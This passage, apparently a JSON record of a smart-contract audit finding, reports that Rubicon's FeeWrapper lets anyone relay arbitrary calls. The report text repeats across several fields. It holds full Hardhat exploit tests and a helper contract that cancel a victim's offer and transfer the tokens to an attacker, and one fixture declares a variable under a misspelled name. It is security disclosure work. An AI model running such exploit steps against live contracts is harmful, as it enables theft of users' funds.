iface._encodeParams(cancelFunc.inputs, [5])\n  console.log(await feeWrapper.rubicall(\n    {\n      selector: cancelFuncSig,\n      args: cancelFuncParams,\n      target: router.address,\n      feeParams: {\n        feeToken: testCoin.address,\n        totalAmount: 0,\n        feeAmount: 0,\n        feeTo: testCoin.address\n      }\n    }\n  ))\n});\n```\n\n## Recommended Mitigation Steps\n\nWe recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.\n\nAlso, we think `FeeWrapper` functions should have a reentry guard.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all tokens of users that use `FeeWrapper`.\n\n## Proof of Concept\n\nThere is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter` \nthrough the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead\nof the address of the user. This will cause all offers to be owned by `FeeWrapper`.\n\nThis means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw his tokens\non his behalf. Here is an example of the flow of events that could occur:\n\n1. A victim sends his token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts\n    - The 3rd party creates an offer through the `FeeWrapper`.\n2. A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.\n3. The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.\n\n\nAs seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). So, for example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.\n\n\n### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`\n\nThis exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`\nby creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his\ntokens.\n\nWe modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and\nmodified the `pepeFinance` to use our example 3rd party.\n\n```typescript\nimport { loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { parseUnits } from \"ethers/lib/utils\";\nimport { ethers } from \"hardhat\";\nconst { expect } = require(\"chai\");\n\ndescribe(\"Fee Wrapper\", function () {\n  const FEE_TO = \"0x0000000000000000000000000000000000000FEE\";\n\n  async function deployRubiProtocolFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();\n\n    const WETH = await ethers.getContractFactory(\"WETH9\");\n    const weth = await WETH.deploy();\n\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const interestRateModelFacStory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n    const name = \"Test Bath Token\"; // TODO: move this process to Bath House factory\n    const symbol = \"bathTEST\";\n    const decimal = 18;\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    const cTokenDelegatorFactory = await ethers.getContractFactory(\n      \"CErc20Delegator\"\n    );\n\n    const cWETH = await cTokenDelegatorFactory\n      .deploy(\n        weth.address,\n        comptroller.address,\n        interestRateModel,\n        initialExchangeRateMantissa,\n        \"WETH\",\n        \"WETH\",\n        decimal,\n        owner.address, // Admin!\n        cTokenImplementation.address,\n        becomeImplementationData\n      )\n      .catch((e) => {\n        console.log(\"\\nError deploying cWETH!\", e.reason, \"\\n\");\n      });\n    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    const RubiconMarketFactory = await ethers.getContractFactory(\n      \"RubiconMarket\"\n    );\n    const rubiconMarket = await RubiconMarketFactory.deploy();\n    await rubiconMarket.initialize(testMaker.address);\n    await rubiconMarket.setFeeBPS(10);\n\n    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.\n    await testCoin.connect(owner).faucet();\n    await testStableCoin.connect(owner).faucet();\n\n    await testCoin.connect(owner).transfer(victim.address, parseUnits(\"999\"));\n\n    await testCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n    await testStableCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"90\", 6),\n      testStableCoin.address,\n      parseUnits(\"100\"),\n      testCoin.address,\n      { from: owner.address }\n    );\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"100\"),\n      testCoin.address,\n      parseUnits(\"110\", 6),\n      testStableCoin.address,\n      { from: owner.address }\n    );\n\n    const RubiconRouter = await ethers.getContractFactory(\"RubiconRouter\");\n    const router = await RubiconRouter.deploy();\n    await router.startErUp(rubiconMarket.address, weth.address);\n\n    // fee wrapper\n    const FeeWrapper = await ethers.getContractFactory(\"FeeWrapper\");\n    const feeWrapper = await FeeWrapper.deploy();\n\n    // 3rd party protocol\n    const PepeFinance = await ethers.getContractFactory(\"Some3rdPartyProtocol\");\n    const pepeFinance = await PepeFinance.deploy(\n      feeWrapper.address,\n      FEE_TO,\n      rubiconMarket.address\n    );\n\n    await testCoin!.connect(owner).approve(router.address, parseUnits(\"320\"));\n\n    return {\n      rubiconMarket,\n      testCoin,\n      owner,\n      otherAccount,\n      testStableCoin,\n      weth,\n      cWETH,\n      router,\n      feeWrapper,\n      pepeFinance,\n      attacker,\n      victim\n    };\n  }\n  it(\"Exploit steal all tokens from offers created with the `FeeWrapper`\", async function () {\n    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(\n      deployRubiProtocolFixture\n    );\n\n    let victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim has a lot of tokens. Victim's balance = \", victimBalance)\n\n    // Victim puts all his hard-earned money into an offer\n    let pay_amt = testCoin.balanceOf(victim.address);\n    await testCoin\n      .connect(victim)\n      .approve(pepeFinance.address, pay_amt);\n    await pepeFinance.connect(victim).executeOffer(\n      pay_amt,\n      testCoin.address,\n      parseUnits(\"110\"),\n      testStableCoin.address,\n      0\n    );\n    // This is the 3rd offer, hence it would get and ID of 3\n    const victimOfferId = 3;\n\n    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"Before attack attacker has no tokens. Attacker's balance = \", attackerBalance)\n\n\n    let ABI = [\n      \"function cancel(uint256 id)\",\n      \"function transfer(address to, uint256 amount)\"\n    ];\n    let iface = new ethers.utils.Interface(ABI);\n\n    // The attaacker calls `cancel` through the `FeeWrapper`.\n    // This steals the victim's tokens and puts them into the FeeWrapper\n    let cancelFunc = iface.getFunction(\"cancel\")\n    let cancelFuncSig = iface.getSighash(cancelFunc)\n    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])\n    await feeWrapper.rubicall(\n      {\n        selector: cancelFuncSig,\n        args: cancelFuncParams,\n        target: rubiconMarket.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: parseUnits(\"0\"),\n          feeAmount: parseUnits(\"0\"),\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account\n    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)\n    let transferFunc = iface.getFunction(\"transfer\")\n    let transferFuncSig = iface.getSighash(transferFunc)\n    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])\n    await feeWrapper.rubicall(\n      {\n        selector: transferFuncSig,\n        args: transferFuncParams,\n        target: testCoin.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: 0,\n          feeAmount: 0,\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"After attack, attacker has all of the victims tokens. Attacker's balance = \", attackerBalance)\n    victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim is left with nothing. Victim's balance = \", victimBalance)\n\n    // Assert that we really stole all victim's tokens\n    expect(attackerBalance).to.be.gt(0);\n    expect(victimBalance).to.equal(0);\n  })\n});\n```\n\nAnd we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"../RubiconMarket.sol\";\nimport \"../utilities/FeeWrapper.sol\";\n\ncontract Some3rdPartyProtocol {\n    address public feeWrapper;\n    uint256 feeType = 10_000; // BPS\n    uint256 fee = 10; // 10/10_000\n    address feeTo;\n    address rubiMarket;\n\n    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {\n        feeWrapper = _feeWrapper;\n        feeTo = _feeTo;\n        rubiMarket = _rubiMarket;\n    }\n\n    function executeOffer(\n        uint256 pay_amt,\n        address pay_gem,\n        uint256 buy_amt,\n        address buy_gem,\n        uint256 pos\n    ) external returns (uint256) {\n        uint256[] memory tokenAmounts = new uint256[](2);\n        bytes memory id;\n        tokenAmounts[0] = pay_amt;\n    tokenAmounts[1] = buy_amt;\n\n        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);\n\n        // calculate fee to pay using FeeWrapper\n        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(\n            feeWrapper\n        ).calculateFee(tokenAmounts, feeType, fee);\n\n        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(\n            pay_gem,\n            pay_amt,\n            fees_[0],\n            feeTo\n        );\n\n        // update both pay_amt and buy_amt_min with fee deducted\n        pay_amt = new_amounts[0];\n\n        // Call rubiMarket.offer\n        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(\n            bytes4(keccak256(bytes(\"offer(uint256,address,uint256,address)\"))),\n            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),\n            rubiMarket,\n            feeParams\n        );\n        id = FeeWrapper(feeWrapper).rubicall(params);\n\n        return uint256(bytes32(id));\n    }\n}\n```\n\nIf you run the test, you'll see the following output\n\n```\n$ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts\n\nThe victim has a lot of tokens. Victim's balance =  `999000000000000000000`\nBefore attack attacker has no tokens. Attacker's balance =  `0`\nAfter attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`\nThe victim is left with nothing. Victim's balance =  `0`\n```\n\n### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`\n\nTo emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol` as\nwell. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is\nnot capable of accepting `eth`.\n\n\nThe following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds. \n\nJust to be clear, currently, an honest user making an offer can't cancel his own offer.\n\nWe added the following test to `fee-wrapper.ts` that shows this exploit:\n\n\n```solidity\nit(\"should call offerWithETH via 3d party AND STEAL IT ALL!\", async function () {\n  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(\n    deployRubiProtocolFixture\n  );\n\n  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);\n  await pepeFinance.executeOfferWithETH(\n    parseUnits(\"9\"),\n    parseUnits(\"310\"),\n    testCoin.address,\n    0,\n    { value: parseUnits(\"9\") }\n  );\n  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);\n  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);\n\n  // The attacker calls the `FeeWrapper` directly\n  let ABI = [\n    \"function cancelForETH(uint256 id)\"\n  ];\n  let iface = new ethers.utils.Interface(ABI);\n  let cancelFunc = iface.getFunction(\"cancelForETH\")\n  let cancelFuncSig = iface.getSighash(cancelFunc)\n  let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [5])\n  console.log(await feeWrapper.rubicall(\n    {\n      selector: cancelFuncSig,\n      args: cancelFuncParams,\n      target: router.address,\n      feeParams: {\n        feeToken: testCoin.address,\n        totalAmount: 0,\n        feeAmount: 0,\n        feeTo: testCoin.address\n      }\n    }\n  ))\n});\n```\n\n## Recommended Mitigation Steps\n\nWe recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.\n\nAlso, we think `FeeWrapper` functions should have a reentry guard.",
      "description": null,
      "impact": "## Impact\n\nAn attacker can steal all tokens of users that use `FeeWrapper`.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nWe recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.\n\nAlso, we think `FeeWrapper` functions should have a reentry guard.\n",
      "poc": "## Proof of Concept\n\nThere is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter`\nthrough the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead\nof the address of the user. This will cause all offers to be owned by `FeeWrapper`.\n\nThis means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw his tokens\non his behalf. Here is an example of the flow of events that could occur:\n\n1. A victim sends his token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts\n    - The 3rd party creates an offer through the `FeeWrapper`.\n2. A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.\n3. The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.\n\n\nAs seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). So, for example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.\n\n\n### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`\n\nThis exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`\nby creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his\ntokens.\n\nWe modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and\nmodified the `pepeFinance` to use our example 3rd party.\n\n```typescript\nimport { loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { parseUnits } from \"ethers/lib/utils\";\nimport { ethers } from \"hardhat\";\nconst { expect } = require(\"chai\");\n\ndescribe(\"Fee Wrapper\", function () {\n  const FEE_TO = \"0x0000000000000000000000000000000000000FEE\";\n\n  async function deployRubiProtocolFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();\n\n    const WETH = await ethers.getContractFactory(\"WETH9\");\n    const weth = await WETH.deploy();\n\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const interestRateModelFacStory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n    const name = \"Test Bath Token\"; // TODO: move this process to Bath House factory\n    const symbol = \"bathTEST\";\n    const decimal = 18;\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    const cTokenDelegatorFactory = await ethers.getContractFactory(\n      \"CErc20Delegator\"\n    );\n\n    const cWETH = await cTokenDelegatorFactory\n      .deploy(\n        weth.address,\n        comptroller.address,\n        interestRateModel,\n        initialExchangeRateMantissa,\n        \"WETH\",\n        \"WETH\",\n        decimal,\n        owner.address, // Admin!\n        cTokenImplementation.address,\n        becomeImplementationData\n      )\n      .catch((e) => {\n        console.log(\"\\nError deploying cWETH!\", e.reason, \"\\n\");\n      });\n    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    const RubiconMarketFactory = await ethers.getContractFactory(\n      \"RubiconMarket\"\n    );\n    const rubiconMarket = await RubiconMarketFactory.deploy();\n    await rubiconMarket.initialize(testMaker.address);\n    await rubiconMarket.setFeeBPS(10);\n\n    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.\n    await testCoin.connect(owner).faucet();\n    await testStableCoin.connect(owner).faucet();\n\n    await testCoin.connect(owner).transfer(victim.address, parseUnits(\"999\"));\n\n    await testCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n    await testStableCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"90\", 6),\n      testStableCoin.address,\n      parseUnits(\"100\"),\n      testCoin.address,\n      { from: owner.address }\n    );\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"100\"),\n      testCoin.address,\n      parseUnits(\"110\", 6),\n      testStableCoin.address,\n      { from: owner.address }\n    );\n\n    const RubiconRouter = await ethers.getContractFactory(\"RubiconRouter\");\n    const router = await RubiconRouter.deploy();\n    await router.startErUp(rubiconMarket.address, weth.address);\n\n    // fee wrapper\n    const FeeWrapper = await ethers.getContractFactory(\"FeeWrapper\");\n    const feeWrapper = await FeeWrapper.deploy();\n\n    // 3rd party protocol\n    const PepeFinance = await ethers.getContractFactory(\"Some3rdPartyProtocol\");\n    const pepeFinance = await PepeFinance.deploy(\n      feeWrapper.address,\n      FEE_TO,\n      rubiconMarket.address\n    );\n\n    await testCoin!.connect(owner).approve(router.address, parseUnits(\"320\"));\n\n    return {\n      rubiconMarket,\n      testCoin,\n      owner,\n      otherAccount,\n      testStableCoin,\n      weth,\n      cWETH,\n      router,\n      feeWrapper,\n      pepeFinance,\n      attacker,\n      victim\n    };\n  }\n  it(\"Exploit steal all tokens from offers created with the `FeeWrapper`\", async function () {\n    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(\n      deployRubiProtocolFixture\n    );\n\n    let victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim has a lot of tokens. Victim's balance = \", victimBalance)\n\n    // Victim puts all his hard-earned money into an offer\n    let pay_amt = testCoin.balanceOf(victim.address);\n    await testCoin\n      .connect(victim)\n      .approve(pepeFinance.address, pay_amt);\n    await pepeFinance.connect(victim).executeOffer(\n      pay_amt,\n      testCoin.address,\n      parseUnits(\"110\"),\n      testStableCoin.address,\n      0\n    );\n    // This is the 3rd offer, hence it would get and ID of 3\n    const victimOfferId = 3;\n\n    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"Before attack attacker has no tokens. Attacker's balance = \", attackerBalance)\n\n\n    let ABI = [\n      \"function cancel(uint256 id)\",\n      \"function transfer(address to, uint256 amount)\"\n    ];\n    let iface = new ethers.utils.Interface(ABI);\n\n    // The attaacker calls `cancel` through the `FeeWrapper`.\n    // This steals the victim's tokens and puts them into the FeeWrapper\n    let cancelFunc = iface.getFunction(\"cancel\")\n    let cancelFuncSig = iface.getSighash(cancelFunc)\n    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])\n    await feeWrapper.rubicall(\n      {\n        selector: cancelFuncSig,\n        args: cancelFuncParams,\n        target: rubiconMarket.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: parseUnits(\"0\"),\n          feeAmount: parseUnits(\"0\"),\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account\n    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)\n    let transferFunc = iface.getFunction(\"transfer\")\n    let transferFuncSig = iface.getSighash(transferFunc)\n    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])\n    await feeWrapper.rubicall(\n      {\n        selector: transferFuncSig,\n        args: transferFuncParams,\n        target: testCoin.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: 0,\n          feeAmount: 0,\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"After attack, attacker has all of the victims tokens. Attacker's balance = \", attackerBalance)\n    victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim is left with nothing. Victim's balance = \", victimBalance)\n\n    // Assert that we really stole all victim's tokens\n    expect(attackerBalance).to.be.gt(0);\n    expect(victimBalance).to.equal(0);\n  })\n});\n```\n\nAnd we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"../RubiconMarket.sol\";\nimport \"../utilities/FeeWrapper.sol\";\n\ncontract Some3rdPartyProtocol {\n    address public feeWrapper;\n    uint256 feeType = 10_000; // BPS\n    uint256 fee = 10; // 10/10_000\n    address feeTo;\n    address rubiMarket;\n\n    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {\n        feeWrapper = _feeWrapper;\n        feeTo = _feeTo;\n        rubiMarket = _rubiMarket;\n    }\n\n    function executeOffer(\n        uint256 pay_amt,\n        address pay_gem,\n        uint256 buy_amt,\n        address buy_gem,\n        uint256 pos\n    ) external returns (uint256) {\n        uint256[] memory tokenAmounts = new uint256[](2);\n        bytes memory id;\n        tokenAmounts[0] = pay_amt;\n    tokenAmounts[1] = buy_amt;\n\n        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);\n\n        // calculate fee to pay using FeeWrapper\n        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(\n            feeWrapper\n        ).calculateFee(tokenAmounts, feeType, fee);\n\n        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(\n            pay_gem,\n            pay_amt,\n            fees_[0],\n            feeTo\n        );\n\n        // update both pay_amt and buy_amt_min with fee deducted\n        pay_amt = new_amounts[0];\n\n        // Call rubiMarket.offer\n        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(\n            bytes4(keccak256(bytes(\"offer(uint256,address,uint256,address)\"))),\n            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),\n            rubiMarket,\n            feeParams\n        );\n        id = FeeWrapper(feeWrapper).rubicall(params);\n\n        return uint256(bytes32(id));\n    }\n}\n```\n\nIf you run the test, you'll see the following output\n\n```\n$ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts\n\nThe victim has a lot of tokens. Victim's balance =  `999000000000000000000`\nBefore attack attacker has no tokens. Attacker's balance =  `0`\nAfter attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`\nThe victim is left with nothing. Victim's balance =  `0`\n```\n\n### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`\n\nTo emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol` as\nwell. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is\nnot capable of accepting `eth`.\n\n\nThe following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds.\n\nJust to be clear, currently, an honest user making an offer can't cancel his own offer.\n\nWe added the following test to `fee-wrapper.ts` that shows this exploit:\n\n\n```solidity\nit(\"should call offerWithETH via 3d party AND STEAL IT ALL!\", async function () {\n  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(\n    deployRubiProtocolFixture\n  );\n\n  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);\n  await pepeFinance.executeOfferWithETH(\n    parseUnits(\"9\"),\n    parseUnits(\"310\"),\n    testCoin.address,\n    0,\n    { value: parseUnits(\"9\") }\n  );\n  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);\n  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);\n\n  // The attacker calls the `FeeWrapper` directly\n  let ABI = [\n    \"function cancelForETH(uint256 id)\"\n  ];\n  let iface = new ethers.utils.Interface(ABI);\n  let cancelFunc = iface.getFunction(\"cancelForETH\")\n  let cancelFuncSig = iface.getSighash(cancelFunc)\n  let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [5])\n  console.log(await feeWrapper.rubicall(\n    {\n      selector: cancelFuncSig,\n      args: cancelFuncParams,\n      target: router.address,\n      feeParams: {\n        feeToken: testCoin.address,\n        totalAmount: 0,\n        feeAmount: 0,\n        feeTo: testCoin.address\n      }\n    }\n  ))\n});\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nAn attacker can steal all tokens of users that use `FeeWrapper`.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nWe recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.\n\nAlso, we think `FeeWrapper` functions should have a reentry guard.\n",
        "poc": "## Proof of Concept\n\nThere is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter`\nthrough the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead\nof the address of the user. This will cause all offers to be owned by `FeeWrapper`.\n\nThis means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw his tokens\non his behalf. Here is an example of the flow of events that could occur:\n\n1. A victim sends his token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts\n    - The 3rd party creates an offer through the `FeeWrapper`.\n2. A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.\n3. The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.\n\n\nAs seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). So, for example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.\n\n\n### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`\n\nThis exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`\nby creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his\ntokens.\n\nWe modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and\nmodified the `pepeFinance` to use our example 3rd party.\n\n```typescript\nimport { 